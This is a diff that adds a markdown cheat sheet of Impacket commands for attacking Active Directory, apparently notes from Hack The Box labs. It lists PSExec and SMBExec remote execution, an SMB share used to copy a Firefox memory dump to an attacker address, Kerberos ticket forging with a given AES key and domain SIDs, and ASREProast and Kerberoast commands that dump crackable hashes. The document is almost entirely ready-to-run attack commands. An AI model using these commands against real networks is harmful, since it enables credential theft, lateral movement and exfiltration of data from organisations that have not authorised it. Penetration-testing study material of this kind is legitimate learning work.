@@ -1,0 +1,75 @@
+https://github.com/fortra/impacket/releases
+
+### MSSQLClient
+```bash
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
+```
+### Impacket - PSExec
+```bash
+psexec.py 'user:pass@ipaddr'
+
+psexec.py -dc-ip infiltrator.htb -target-ip infiltrator.htb -no-pass -k infiltrator.htb/E.RODRIGUEZ@infiltrator.htb
+```
+### Impacket - SMBServer
+```bash
+smbserver.py -smb2support -username guest -password guest share ./
+
+# Windows Connection
+net use x: \\10.10.14.165\share /user:guest guest
+
+# Copy Files
+cmd /c "copy firefox.dmp X:\"
+```
+### Impacket - SMBExec
+```bash
+impacket-smbexec -k -no-pass -dc-ip 10.10.11.24 CORP.GHOST.HTB/administrator@dc01.ghost.htb
+```
+### Impacket - TicketConvertor
+```bash
+ticketConverter.py /PATH/ticket.kirbi ticket.ccache
+
+export=KRB5CCNAME=/PATH/ticket.ccache
+```
+### Impacket - Ticketer
+```bash
+impacket-ticketer -aesKey b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -domain corp.ghost.htb administrator
+```
+### Impacket - Samrdump.py
+```bash
+samrdump.py 10.129.14.128
+```
+
+### Impacket - GetTGT.py
+```
+getTGT.py -dc-ip dc01.infiltrator.htb infiltrator.htb/D.anderson
+```
+### Impacket - GetNPUsers.py
+[GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) can be used to retrieve domain users who have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password. This attack is known as [ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast).
+```
+# users list dynamically queried with an RPC null session
+GetNPUsers.py -dc-ip dc01.infiltrator.htb -usersfile users.txt infiltrator.htb/
+
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+
+# with a users file
+GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+
+# users list dynamically queried with a LDAP authenticated bind (password)
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+
+# users list dynamically queried with a LDAP authenticated bind (NT hash)
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+```
+
+### Impacket - GetUserSPNs
+[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) can be used to obtain a password hash for user accounts that have an SPN (service principal name). If an SPN is set on a user account it is possible to request a Service Ticket for this account and attempt to crack it in order to retrieve the user password. This attack is named [Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This script can also be used for [Kerberoast without preauthentication](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication).
+```
+# with a password
+GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+
+# with an NT hash
+GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+
+# Kerberoast without preauthentication
+GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
+```
